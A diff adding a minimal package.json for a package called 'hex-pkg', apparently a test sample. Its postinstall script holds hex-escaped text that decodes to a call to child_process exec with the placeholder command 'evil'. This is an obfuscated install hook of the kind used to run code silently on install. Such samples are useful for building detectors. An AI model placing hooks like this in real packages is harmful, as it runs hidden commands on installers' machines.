@@ -1,0 +1,7 @@
+{
+  "name": "hex-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "\\x72\\x65\\x71\\x75\\x69\\x72\\x65('\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73').exec('evil')"
+  }
+}
